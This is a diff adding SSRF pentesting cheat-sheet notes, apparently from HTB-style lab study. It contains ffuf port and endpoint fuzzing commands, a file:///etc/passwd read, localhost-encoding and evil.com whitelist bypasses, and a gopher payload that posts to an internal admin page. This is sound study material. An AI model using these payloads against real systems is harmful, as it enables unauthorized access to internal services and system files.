@@ -4,6 +4,106 @@
 
 ---
 
+**Overall:**
+```
+SSRF - Pentester Mindset Map
+├── 1. Identify
+│   ├── Netcat Listener → Use your IP to catch outbound request
+│   └── Self-Reflect Test → http://127.0.0.1:PORT/index.php
+│
+├── 2. Enumerate
+│   ├── Port Enumeration
+│   │   └── ffuf -w ./ports.txt -u http://TARGET-IP/index.php -X POST \
+│   │       -H "Content-Type: application/x-www-form-urlencoded" \
+│   │       -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
+│   │       -fr "Failed to connect to"
+│   │
+│   ├── Endpoint Enumeration
+│   │   └── ffuf -w raft-small-words.txt -u http://TARGET-IP/index.php -X POST \
+│   │       -H "Content-Type: application/x-www-form-urlencoded" \
+│   │       -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
+│   │       -fr "Server at dateserver.htb Port 80"
+│   │
+│   └── LFI via SSRF
+│       └── dateServer=file:///etc/passwd&date=2024-01-01
+│
+└── 3. Advanced - Gopher Protocol
+    ├── Purpose: Send arbitrary bytes to a TCP socket
+    ├── Use Case: Craft raw HTTP requests (POST, PUT, etc.)
+    └── Goal: Internal service abuse (e.g., Redis, HTTP APIs, etc.)
+```
+
+**Bypass:**
+```
+SSRF - Circumventing Common Defenses
+├── 1. Blacklist Filters
+│   ├── Alternative IP Representations
+│   │   ├── Decimal → http://2130706433
+│   │   ├── Octal → http://0177.0.0.1
+│   │   └── Hex → http://0x7f000001
+│   ├── Use a Domain that Resolves to 127.0.0.1
+│   ├── Obfuscate Blocked Strings (e.g., "localhost", "admin")
+│   └── Controlled Redirects
+│       └── Use your own domain to redirect to internal IP
+│
+├── 2. Whitelist Filters
+│   ├── URL Credential Injection
+│   │   └── https://expected-host:fakepass@evil.com
+│   ├── Fragment Injection
+│   │   └── https://evil.com#expected.com
+│   ├── Subdomain Trick
+│   │   └── https://expected.evil.com
+│   ├── URL Encoding
+│   │   ├── Single encoding → %2e, %2f, etc.
+│   │   └── Double encoding → %%32%65
+│   └── Combine Techniques
+│       └── Step-by-step chaining to bypass layered filters
+│
+└── 3. Open Redirects
+    ├── Abuse redirection parameters
+    │   └── /product/nextProduct?currentProductId=6&path=http://evil-user.net
+    └── Redirect chain → External → Internal
+```
+
+**Blind:**
+```
+Blind SSRF – Pentester Mindset Map
+├── 1. Finding Hidden SSRF Attack Surface
+│   ├── Partial URLs in Parameters
+│   │   └── App constructs full URL on server-side (e.g., user provides only hostname)
+│   ├── URLs Embedded in Data Formats
+│   │   └── XML → XXE → SSRF (parser loads URL internally)
+│   └── Referer Header Exploitation
+│       └── Analytics software visits Referer URLs
+│           └── Can trigger SSRF when Referer is attacker-controlled
+│
+├── 2. Exploiting Blind SSRF
+│   ├── Challenge: No Direct Response
+│   ├── Local Port Scanning via Behavior Differences
+│   │   ├── Closed Port → "Something went wrong!"
+│   │   └── Open Port → "Date is unavailable..."
+│   ├── Enumerate Internal Services Based on Response
+│   ├── File Existence Inference
+│   │   └── Existing file → Subtle message or valid response
+│   │   └── Non-existent file → Error or fail message
+│   └── Mindset:
+│       ├── “Look for timing, behavioral, or error-based clues.”
+│       └── “Blind ≠ impossible. It just means be patient and clever.”
+```
+
+### Exploitation
+- Internal port scanning by accessing ports on localhost
+- Accessing restricted endpoints
+
+### Protocol Examples
+```
+http://127.0.0.1/
+file:///etc/passwd
+gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+```
+
+---
+
 ## Table of Contents
 
 - [1. Key URL Schemes](#1-key-url-schemes)
